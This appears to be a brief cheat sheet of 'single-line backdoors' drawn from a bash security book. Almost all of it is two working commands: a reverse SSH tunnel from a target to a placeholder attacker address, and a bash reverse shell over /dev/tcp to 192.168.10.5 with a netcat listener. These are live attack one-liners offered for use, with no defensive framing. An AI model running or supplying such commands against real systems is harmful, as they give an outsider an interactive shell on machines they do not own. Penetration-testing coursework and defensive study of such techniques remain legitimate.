# Single-line backdoors

Reverse SSH

```sh
# target
ssh -R 12345:localhost:22 user@attackeripaddress
# attacker
ssh localhost -p 12345
```

Bash backdoor

```sh
# attacker
nc -l 8080
# target
/bin/bash -i < /dev/tcp/192.168.10.5/8080 1>&0 2>&0
```

# Sources and more

* Cybersecurity Ops with bash (2019)
